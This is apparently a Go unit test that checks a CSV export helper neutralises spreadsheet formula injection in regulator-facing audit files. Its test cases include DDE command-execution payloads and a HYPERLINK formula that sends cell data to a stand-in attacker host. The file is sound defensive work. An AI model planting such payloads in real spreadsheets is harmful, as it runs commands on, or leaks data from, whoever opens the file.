package csvx

import "testing"

// The audit export is evidence handed to a regulator, and new_value carries
// text somebody else authored. A cell that starts a formula executes when the
// file is opened.
func TestCellNeutralisesFormulaInjection(t *testing.T) {
	t.Parallel()

	dangerousCases := []struct{ name, in string }{
		{"equals", `=cmd|'/c calc'!A1`},
		{"plus", `+cmd|'/c calc'!A1`},
		{"minus", `-2+3+cmd|'/c calc'!A1`},
		{"at, the DDE prefix", `@SUM(1+1)*cmd|'/c calc'!A1`},
		{"tab, which excel trims before evaluating", "\t=1+1"},
		{"carriage return, same trick", "\r=1+1"},
		{"a hyperlink exfiltrating a cell", `=HYPERLINK("http://evil.example/?x="&A1,"click")`},
	}
	for _, tc := range dangerousCases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			got := Cell(tc.in)
			if got == tc.in {
				t.Fatalf("Cell(%q) returned it unchanged; it will evaluate as a formula", tc.in)
			}
			if got[0] != '\'' {
				t.Fatalf("Cell(%q) = %q, want a leading apostrophe", tc.in, got)
			}
			if got[1:] != tc.in {
				t.Fatalf("Cell(%q) altered the value beyond the prefix: %q", tc.in, got)
			}
		})
	}

	// Ordinary values must survive untouched, or the export stops being a
	// faithful rendering of the row.
	safe := []string{
		"", "dispute.resolved", "admin_user",
		"7d2f4b1a-0000-4a3b-9c1d-2f3e4a5b6c7d",
		"2026-08-20T09:15:00.123456Z",
		"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
		`{"status":"resolved"}`, "127.0.0.1", "Mozilla/5.0", "1234",
	}
	for _, s := range safe {
		if got := Cell(s); got != s {
			t.Fatalf("Cell(%q) = %q; ordinary values must pass through byte for byte", s, got)
		}
	}
}

func TestRowEscapesEveryCell(t *testing.T) {
	t.Parallel()
	got := Row([]string{"ok", "=1+1", "", "-1"})
	want := []string{"ok", "'=1+1", "", "'-1"}
	for i := range want {
		if got[i] != want[i] {
			t.Fatalf("Row()[%d] = %q, want %q", i, got[i], want[i])
		}
	}
}
